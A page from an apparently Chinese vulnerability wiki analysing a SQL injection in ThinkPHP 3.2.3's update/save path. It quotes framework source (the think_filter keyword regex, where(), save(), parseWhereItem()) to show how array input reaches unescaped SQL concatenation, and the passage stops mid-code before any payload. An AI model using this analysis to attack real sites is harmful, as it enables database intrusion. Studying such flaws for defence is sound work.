<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Thinkphp 3.2.3 update注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Thinkphp 3.2.3 update\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Thinkphp 3.2.3 缓存漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Thinkphp_3.2.3_select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Thinkphp_3.2.3_select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="thinkphp-323-update">Thinkphp 3.2.3 update注入漏洞<a class="headerlink" href="#thinkphp-323-update" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>thinkphp是国内著名的php开发框架，有完善的开发文档，基于MVC架构，其中Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是普及度高于新出的thinkphp5系列，由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>\&lt;= 3.2.3</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>这个问题很早之前就注意到了，只是一直没找到更常规的写法去导致注入的产生，在挖掘框架漏洞的标准是在使用官方的标准开发方式的前提下也会产生可以用的漏洞，这样才算框架级漏洞，跟普通的业务代码漏洞是有严格界线的。</p>
<p>thinkphp系列框架过滤表达式注入多半采用I函数去调用think_filter</p>
<div class="codehilite"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="n">think_filter</span><span class="p">(</span><span class="o">&amp;</span><span class="n">$value</span><span class="p">){</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">preg_match</span><span class="p">(&#39;</span><span class="o">/^</span><span class="p">(</span><span class="n">EXP</span><span class="o">|</span><span class="n">NEQ</span><span class="o">|</span><span class="n">GT</span><span class="o">|</span><span class="n">EGT</span><span class="o">|</span><span class="n">LT</span><span class="o">|</span><span class="n">ELT</span><span class="o">|</span><span class="n">OR</span><span class="o">|</span><span class="n">XOR</span><span class="o">|</span><span class="n">LIKE</span><span class="o">|</span><span class="n">NOTLIKE</span><span class="o">|</span><span class="n">NOT</span><span class="w"> </span><span class="n">BETWEEN</span><span class="o">|</span><span class="n">NOTBETWEEN</span><span class="o">|</span><span class="n">BETWEEN</span><span class="o">|</span><span class="n">NOTIN</span><span class="o">|</span><span class="n">NOT</span><span class="w"> </span><span class="n">IN</span><span class="o">|</span><span class="n">IN</span><span class="p">)</span><span class="err">$</span><span class="o">/</span><span class="n">i</span><span class="p">&#39;,</span><span class="n">$value</span><span class="p">))</span>
</code></pre></div>

<p>有没有相关tips来达到I函数绕过呢？是可以的。</p>
<p><a href="http://document.thinkphp.cn/manual_3_2.html#update_data">http://document.thinkphp.cn/manual_3_2.html#update_data</a></p>
<p>一般按照官方的写法，thinkphp提供了数据库链式操作，其中包含连贯操作和curd操作，在进行数据库CURD操作去更新数据的时候：
举例update数据操作。</p>
<p><img alt="" src="../resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.jpg" /></p>
<p>where制定主键的数值，save方法去更新变量传进来的参数到数据库的指定位置。</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">where</span><span class="p">(</span><span class="o">$</span><span class="n">where</span><span class="p">,</span><span class="o">$</span><span class="n">parse</span><span class="o">=</span><span class="nb nb-Type">null</span><span class="p">){</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">is_null</span><span class="p">(</span><span class="o">$</span><span class="n">parse</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_string</span><span class="p">(</span><span class="o">$</span><span class="n">where</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">parse</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">$</span><span class="n">parse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">func_get_args</span><span class="p">();</span>
<span class="w">                </span><span class="n">array_shift</span><span class="p">(</span><span class="o">$</span><span class="n">parse</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="o">$</span><span class="n">parse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array_map</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="p">,</span><span class="s1">&#39;escapeString&#39;</span><span class="p">),</span><span class="o">$</span><span class="n">parse</span><span class="p">);</span>
<span class="w">            </span><span class="o">$</span><span class="n">where</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="n">vsprintf</span><span class="p">(</span><span class="o">$</span><span class="n">where</span><span class="p">,</span><span class="o">$</span><span class="n">parse</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="n">elseif</span><span class="p">(</span><span class="n">is_object</span><span class="p">(</span><span class="o">$</span><span class="n">where</span><span class="p">)){</span>
<span class="w">            </span><span class="o">$</span><span class="n">where</span><span class="w">  </span><span class="o">=</span><span class="w">   </span><span class="n">get_object_vars</span><span class="p">(</span><span class="o">$</span><span class="n">where</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">is_string</span><span class="p">(</span><span class="o">$</span><span class="n">where</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">$</span><span class="n">where</span><span class="p">){</span>
<span class="w">            </span><span class="o">$</span><span class="n">map</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="n">array</span><span class="p">();</span>
<span class="w">            </span><span class="o">$</span><span class="n">map</span><span class="p">[</span><span class="s1">&#39;_string&#39;</span><span class="p">]</span><span class="w">   </span><span class="o">=</span><span class="w">   </span><span class="o">$</span><span class="n">where</span><span class="p">;</span>
<span class="w">            </span><span class="o">$</span><span class="n">where</span><span class="w">  </span><span class="o">=</span><span class="w">   </span><span class="o">$</span><span class="n">map</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w">        </span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">])){</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="n">array_merge</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">],</span><span class="o">$</span><span class="n">where</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="o">$</span><span class="n">where</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>通过where方法获取where()链式中进来的参数值，并对参数进行检查，是否为字符串，tp框架默认是对字符串进行过滤的</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">save</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="o">=</span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="err">$</span><span class="n">options</span><span class="o">=</span><span class="n">array</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// 没有传递数据，获取当前数据对象的值</span>
<span class="w">            </span><span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="kt">data</span><span class="w">           </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
<span class="w">                </span><span class="c1">// 重置数据</span>
<span class="w">                </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="kt">data</span><span class="w">     </span><span class="o">=</span><span class="w">   </span><span class="n">array</span><span class="p">();</span>
<span class="w">            </span><span class="p">}</span><span class="n">else</span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="n">L</span><span class="p">(</span><span class="s">&#39;_DATA_TYPE_INVALID_&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="c1">// 数据处理</span>
<span class="w">        </span><span class="err">$</span><span class="kt">data</span><span class="w">       </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_facade</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">);</span>
<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">)){</span>
<span class="w">            </span><span class="c1">// 没有数据则不执行</span>
<span class="w">            </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="n">L</span><span class="p">(</span><span class="s">&#39;_DATA_TYPE_INVALID_&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="c1">// 分析表达式</span>
<span class="w">        </span><span class="err">$</span><span class="n">options</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_parseOptions</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
<span class="w">        </span><span class="err">$</span><span class="n">pk</span><span class="w">         </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getPk</span><span class="p">();</span>
<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// 如果存在主键数据 则自动作为更新条件</span>
<span class="w">            </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_string</span><span class="p">(</span><span class="err">$</span><span class="n">pk</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">pk</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="n">where</span><span class="p">[</span><span class="err">$</span><span class="n">pk</span><span class="p">]</span><span class="w">     </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">pk</span><span class="p">];</span>
<span class="w">                </span><span class="n">unset</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">pk</span><span class="p">]);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="n">elseif</span><span class="w"> </span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">pk</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// 增加复合主键支持</span>
<span class="w">                </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">pk</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="err">$</span><span class="n">field</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nf">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">field</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="err">$</span><span class="n">where</span><span class="p">[</span><span class="err">$</span><span class="n">field</span><span class="p">]</span><span class="w">      </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">field</span><span class="p">];</span>
<span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                           </span><span class="c1">// 如果缺少复合主键数据则不执行</span>
<span class="w">                        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="w">        </span><span class="o">=</span><span class="w">   </span><span class="n">L</span><span class="p">(</span><span class="s">&#39;_OPERATION_WRONG_&#39;</span><span class="p">);</span>
<span class="w">                        </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                    </span><span class="n">unset</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">field</span><span class="p">]);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">where</span><span class="p">)){</span>
<span class="w">                </span><span class="c1">// 如果没有任何更新条件则不执行</span>
<span class="w">                </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="w">        </span><span class="o">=</span><span class="w">   </span><span class="n">L</span><span class="p">(</span><span class="s">&#39;_OPERATION_WRONG_&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span><span class="n">else</span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">]</span><span class="w">   </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">where</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">][</span><span class="err">$</span><span class="n">pk</span><span class="p">])){</span>
<span class="w">            </span><span class="err">$</span><span class="n">pkValue</span><span class="w">    </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">][</span><span class="err">$</span><span class="n">pk</span><span class="p">];</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="kr">false</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_before_update</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">,</span><span class="err">$</span><span class="n">options</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="err">$</span><span class="n">result</span><span class="w">     </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">update</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">,</span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="kr">false</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="err">$</span><span class="n">result</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_numeric</span><span class="p">(</span><span class="err">$</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nf">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">pkValue</span><span class="p">))</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="err">$</span><span class="n">pk</span><span class="p">]</span><span class="w">   </span><span class="o">=</span><span class="w">  </span><span class="err">$</span><span class="n">pkValue</span><span class="p">;</span>
<span class="w">            </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_after_update</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">,</span><span class="err">$</span><span class="n">options</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>再来到save方法，通过前面的数据处理解析服务端数据库中的数据字段信息，字段数据类型，再到_parseOptions表达式分析，获取到表名，数据表别名，记录操作的模型名称，再去调用回调函数进入update</p>
<p>我们这里先直接看框架的where子单元函数，之前网上公开的exp表达式注入就是从这里分析出来的结论：</p>
<p>Thinkphp/Library/Think/Db/Driver.class.php</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// where子单元分析</span>
<span class="w">    </span><span class="k">protected</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">parseWhereItem</span><span class="p">(</span><span class="err">$</span><span class="nx">key</span><span class="p">,</span><span class="err">$</span><span class="nx">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="nx">exp</span><span class="w">    </span><span class="p">=</span><span class="w">    </span><span class="nx">strtolower</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/^</span><span class="p">(</span><span class="nx">eq</span><span class="o">|</span><span class="nx">neq</span><span class="o">|</span><span class="nx">gt</span><span class="o">|</span><span class="nx">egt</span><span class="o">|</span><span class="nx">lt</span><span class="o">|</span><span class="nx">elt</span><span class="p">)</span><span class="err">$</span><span class="o">/</span><span class="err">&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">exp</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 比较运算</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">exp</span><span class="p">[</span><span class="err">$</span><span class="nx">exp</span><span class="p">].</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">                </span><span class="p">}</span><span class="nx">elseif</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/^</span><span class="p">(</span><span class="nx">notlike</span><span class="o">|</span><span class="k">like</span><span class="p">)</span><span class="err">$</span><span class="o">/</span><span class="err">&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">exp</span><span class="p">)){</span><span class="c1">// 模糊查找</span>
<span class="w">                    </span><span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="err">$</span><span class="nx">likeLogic</span><span class="w">  </span><span class="p">=</span><span class="w">   </span><span class="nx">isset</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">2</span><span class="p">])?</span><span class="nx">strtoupper</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">2</span><span class="p">]):</span><span class="err">&#39;</span><span class="nx">OR</span><span class="err">&#39;</span><span class="p">;</span>
<span class="w">                        </span><span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="err">$</span><span class="nx">likeLogic</span><span class="p">,</span><span class="nx">array</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">AND</span><span class="sc">&#39;,&#39;</span><span class="nx">OR</span><span class="sc">&#39;,&#39;</span><span class="nx">XOR</span><span class="err">&#39;</span><span class="p">))){</span>
<span class="w">                            </span><span class="err">$</span><span class="k">like</span><span class="w">       </span><span class="p">=</span><span class="w">   </span><span class="nx">array</span><span class="p">();</span>
<span class="w">                            </span><span class="nx">foreach</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">$</span><span class="nx">item</span><span class="p">){</span>
<span class="w">                                </span><span class="err">$</span><span class="k">like</span><span class="p">[]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">exp</span><span class="p">[</span><span class="err">$</span><span class="nx">exp</span><span class="p">].</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="err">$</span><span class="nx">item</span><span class="p">);</span>
<span class="w">                            </span><span class="p">}</span>
<span class="w">                            </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="sc">&#39;(&#39;</span><span class="p">.</span><span class="nx">implode</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">likeLogic</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">,</span><span class="err">$</span><span class="k">like</span><span class="p">).</span><span class="sc">&#39;)&#39;</span><span class="p">;</span><span class="w">                          </span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                        </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">exp</span><span class="p">[</span><span class="err">$</span><span class="nx">exp</span><span class="p">].</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span><span class="nx">elseif</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">bind</span><span class="err">&#39;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">$</span><span class="nx">exp</span><span class="w"> </span><span class="p">){</span><span class="w"> </span><span class="c1">// 使用表达式</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="err">&#39;</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">:</span><span class="err">&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">                </span><span class="p">}</span><span class="nx">elseif</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">exp</span><span class="err">&#39;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">$</span><span class="nx">exp</span><span class="w"> </span><span class="p">){</span><span class="w"> </span><span class="c1">// 使用表达式</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
